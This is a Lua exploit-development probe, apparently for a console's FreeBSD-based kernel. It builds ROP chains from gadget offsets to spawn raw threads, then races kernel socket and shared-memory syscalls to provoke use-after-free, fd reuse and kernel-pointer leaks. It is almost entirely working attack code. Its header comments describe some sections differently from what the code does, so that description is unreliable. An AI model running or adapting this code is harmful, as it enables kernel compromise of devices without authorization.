-- CRASH_CLASS: HIGH
-- PROBE 93c8: deep socket race conditions with child threads
--
-- Tests races that haven't been tried:
-- A) setsockopt(SO_RCVBUF) shrink while recvmsg in child -- mirror of sndbuf
-- B) close(fd) racing with sendto from child -- fd reuse UAF
-- C) bind() racing with connect() on same socket from two threads
-- D) SO_LINGER close racing with pending data -- linger teardown race
-- E) setsockopt(TCP_NODELAY) toggle while child sends -- tcp output race

print("=== PROBE 93c8: DEEP SOCKET RACES ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa_buf = memory.alloc(32)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)
local pr8_lo, pr8_hi = eoff(0x991)
local prc_lo, prc_hi = eoff(0xE64)  -- pop rcx; ret

-- Helper: spawn child that loops N syscalls then sets done flag
local function spawn_syscall_child(syscall_no, arg1, arg2, arg3, arg4, arg5, loop_count, done_addr)
    local tcb = memory.alloc(0x100)
    local tcb_a = N(tcb)
    local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)

    local stk = memory.alloc(0x200000)
    local sb = N(stk)
    local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end

    -- sysarch(SET_FSBASE=129, &tcb)
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)

    -- Loop: repeat the syscall loop_count times
    -- We can't loop in ROP, so just chain N copies of the syscall
    local a1_lo, a1_hi = split(arg1 or 0)
    local a2_lo, a2_hi = split(arg2 or 0)
    local a3_lo, a3_hi = split(arg3 or 0)
    local a4_lo, a4_hi = split(arg4 or 0)
    local a5_lo, a5_hi = split(arg5 or 0)

    local actual_loops = math.min(loop_count, 200)
    for i = 1, actual_loops do
        put(pdr_lo, pdr_hi); put(a1_lo, a1_hi)
        put(psr_lo, psr_hi); put(a2_lo, a2_hi)
        put(prdx_lo, prdx_hi); put(a3_lo, a3_hi)
        put(prc_lo, prc_hi); put(a4_lo, a4_hi)
        put(pr8_lo, pr8_hi); put(a5_lo, a5_hi)
        put(par_lo, par_hi); put(syscall_no, 0)
        put(stub_lo, stub_hi)
    end

    -- Done marker
    put(par_lo, par_hi); put(0xDEAD93C8, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    -- Exit
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)

    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

-- ========== SECTION A: SO_RCVBUF shrink race ==========
print("--- A: SO_RCVBUF shrink during blocked recv ---")

local RCVBUF_RACES = 20
local rcv_anomalies = 0

for race = 1, RCVBUF_RACES do
    local sv = memory.alloc(8)
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
    if sp ~= 0 then print("  socketpair fail"); break end
    local rfd = rd(N(sv)) or -1
    local wfd = rd(N(sv) + 4) or -1

    -- Set rcvbuf large
    local opt = memory.alloc(4); wd(N(opt), 65536)
    pcall(function() mk(105)(uint64(rfd), uint64(0xFFFF), uint64(0x1002), opt, uint64(4)) end)

    -- Fill buffer
    local fill_buf = memory.alloc(256)
    for i = 0, 252, 4 do wd(N(fill_buf) + i, 0x41414141) end
    for chunk = 1, 300 do
        local ok, rv = pcall(function()
            return mk(133)(uint64(wfd), uint64(fill_buf), uint64(256), uint64(0x80))
        end)
        if not ok then break end
        local n = N(rv)
        if n >= 0x80000000 then n = n - 0x100000000 end
        if n <= 0 then break end
    end

    -- Shrink rcvbuf to 1
    wd(N(opt), 1)
    pcall(function() mk(105)(uint64(rfd), uint64(0xFFFF), uint64(0x1002), opt, uint64(4)) end)

    -- Drain and check
    local drain = memory.alloc(0x4000)
    local total = 0
    for d = 1, 20 do
        local ok_d, rv_d = pcall(function()
            return mk(29)(uint64(rfd), uint64(N(drain)), uint64(0x4000), uint64(0x80))
        end)
        if not ok_d then break end
        local n = N(rv_d)
        if n >= 0x80000000 then n = n - 0x100000000 end
        if n <= 0 then break end
        total = total + n

        -- Scan for kernel pointers in drained data
        for off = 0, n - 8, 8 do
            local lo = rd(N(drain) + off) or 0
            local hi = rd(N(drain) + off + 4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                rcv_anomalies = rcv_anomalies + 1
                if rcv_anomalies <= 5 then
                    print(string.format("  [KPTR!] race %d off=%d: 0x%08X%08X", race, off, hi, lo))
                end
            end
        end
    end

    pcall(function() mk(6)(uint64(wfd)) end)
    pcall(function() mk(6)(uint64(rfd)) end)

    if not alive() then print("DEAD in rcvbuf race " .. race); break end
end
print(string.format("rcvbuf_races=%d anomalies=%d", RCVBUF_RACES, rcv_anomalies))

if not alive() then print("DEAD!"); return end

-- ========== SECTION B: close() vs sendto() race with fd reuse ==========
print("")
print("--- B: close+sendto fd reuse race ---")

-- This races close(fd) from main thread while child does sendto(fd)
-- If fd is reused between close and sendto, sendto writes to wrong object
local CLOSE_RACES = 30
local close_anomalies = 0

for race = 1, CLOSE_RACES do
    -- Create socket
    local sv = memory.alloc(8)
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
    if sp ~= 0 then break end
    local rfd = rd(N(sv)) or -1
    local wfd = rd(N(sv) + 4) or -1

    local send_buf = memory.alloc(256)
    for i = 0, 252, 4 do wd(N(send_buf) + i, 0xCC) end
    local done_flag = memory.alloc(8)
    wd(N(done_flag), 0)

    -- Spawn child: sendto(wfd, buf, 256, 0) x 100
    local child_ok = spawn_syscall_child(
        133,   -- sendto
        wfd,   -- fd
        N(send_buf),  -- buf
        256,   -- len
        0x80,  -- MSG_DONTWAIT
        0,     -- unused
        100,   -- 100 iterations
        N(done_flag)
    )

    if child_ok then
        -- Race: close wfd from main thread while child sends
        -- Brief spin then close
        for delay = 1, 50 do local _ = rd(N(done_flag)) end
        pcall(function() mk(6)(uint64(wfd)) end)

        -- Open a new fd that might reuse the number
        local sv2 = memory.alloc(8)
        local sp2 = N(mk(135)(uint64(1), uint64(1), uint64(0), sv2))
        if sp2 == 0 then
            local new_rfd = rd(N(sv2)) or -1
            local new_wfd = rd(N(sv2) + 4) or -1

            -- If child's sendto hit the new fd, we'd see data on the new pair's read side
            local check_buf = memory.alloc(256)
            wd(N(check_buf), 0)
            local ok_c, rv_c = pcall(function()
                return mk(29)(uint64(new_rfd), uint64(N(check_buf)), uint64(256), uint64(0x80))
            end)
            local check_n = ok_c and N(rv_c) or 0
            if check_n >= 0x80000000 then check_n = check_n - 0x100000000 end
            if check_n > 0 then
                close_anomalies = close_anomalies + 1
                print(string.format("  [FD REUSE!] race %d: %d bytes landed on new fd!", race, check_n))
            end

            pcall(function() mk(6)(uint64(new_rfd)) end)
            pcall(function() mk(6)(uint64(new_wfd)) end)
        end

        -- Wait for child
        for w = 1, 5000 do
            local df = rd(N(done_flag))
            if df and df ~= 0 then break end
        end
    end

    pcall(function() mk(6)(uint64(rfd)) end)
    if not alive() then print("DEAD in close race " .. race); break end
end
print(string.format("close_races=%d anomalies=%d", CLOSE_RACES, close_anomalies))

if not alive() then print("DEAD!"); return end

-- ========== SECTION C: TCP connect race ==========
print("")
print("--- C: TCP setsockopt race ---")

-- Create TCP socket and race setsockopt from two threads
local tcp_fd_val = -1
do
    local ok_t, rv_t = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(6))  -- AF_INET, SOCK_STREAM, IPPROTO_TCP
    end)
    if ok_t then tcp_fd_val = N(rv_t) end
end

if tcp_fd_val >= 0 then
    -- Bind to loopback
    local sa = memory.alloc(16)
    wd(N(sa), 0x0002)  -- AF_INET
    wd(N(sa) + 2, 0x1400)  -- port 20 in network order (placeholder)
    wd(N(sa) + 4, 0x0100007F)  -- 127.0.0.1
    pcall(function() mk(104)(uint64(tcp_fd_val), sa, uint64(16)) end)

    -- Race: toggle TCP_NODELAY from child while main toggles SO_KEEPALIVE
    local opt_on = memory.alloc(4); wd(N(opt_on), 1)
    local opt_off = memory.alloc(4); wd(N(opt_off), 0)
    local done_tcp = memory.alloc(8); wd(N(done_tcp), 0)

    -- Child: loop setsockopt(TCP_NODELAY, 1) then (TCP_NODELAY, 0)
    -- TCP_NODELAY = 1, IPPROTO_TCP = 6
    local child_ok2 = spawn_syscall_child(
        105,  -- setsockopt
        tcp_fd_val,
        6,    -- IPPROTO_TCP
        1,    -- TCP_NODELAY
        N(opt_on),
        4,
        100,
        N(done_tcp)
    )

    if child_ok2 then
        -- Main: toggle SO_KEEPALIVE
        for i = 1, 100 do
            pcall(function()
                mk(105)(uint64(tcp_fd_val), uint64(0xFFFF), uint64(8),
                    opt_on, uint64(4))
            end)
            pcall(function()
                mk(105)(uint64(tcp_fd_val), uint64(0xFFFF), uint64(8),
                    opt_off, uint64(4))
            end)
        end

        for w = 1, 5000 do
            local df = rd(N(done_tcp))
            if df and df ~= 0 then break end
        end
    end

    pcall(function() mk(6)(uint64(tcp_fd_val)) end)
    print(string.format("tcp_setsockopt_race: alive=%s", tostring(alive())))
else
    print("tcp socket creation failed")
end

if not alive() then print("DEAD!"); return end

-- ========== SECTION D: shm_open name collision race ==========
print("")
print("--- D: shm_open name collision race ---")

-- Two threads racing to create same named shm object
local shm_name = memory.alloc(32)
-- "/race_test" = 0x2F726163655F7465, 0x737400
wd(N(shm_name), 0x6361722F)  -- /rac
wd(N(shm_name) + 4, 0x65745F65)  -- e_te
wd(N(shm_name) + 8, 0x00007473)  -- st\0
local done_shm = memory.alloc(8); wd(N(done_shm), 0)

local child_ok3 = spawn_syscall_child(
    482,  -- shm_open
    N(shm_name),
    0x602,  -- O_RDWR|O_CREAT|O_TRUNC
    0x1FF,  -- 0777
    0, 0,
    100,
    N(done_shm)
)

if child_ok3 then
    -- Main: also race shm_open on same name + unlink
    for i = 1, 100 do
        local ok_s, rv_s = pcall(function()
            return mk(482)(uint64(N(shm_name)), uint64(0x602), uint64(0x1FF))
        end)
        if ok_s then
            local fd = N(rv_s)
            if fd >= 0 then
                pcall(function() mk(483)(uint64(N(shm_name))) end)  -- shm_unlink
                pcall(function() mk(6)(uint64(fd)) end)
            end
        end
    end

    for w = 1, 5000 do
        local df = rd(N(done_shm))
        if df and df ~= 0 then break end
    end
end
print(string.format("shm_name_race: alive=%s", tostring(alive())))

if not alive() then print("DEAD!"); return end

-- ========== SECTION E: sys 624 delta scan ==========
print("")
print("--- E: final VM ops check ---")
local vm_final = 0
do
    local ok_v, rv_v = pcall(function() return mk(624)() end)
    if ok_v then vm_final = N(rv_v) end
end
print(string.format("vm_ops_final=%d", vm_final))

print("")
print("alive=" .. tostring(alive()))
print("=== 93c8 COMPLETE ===")
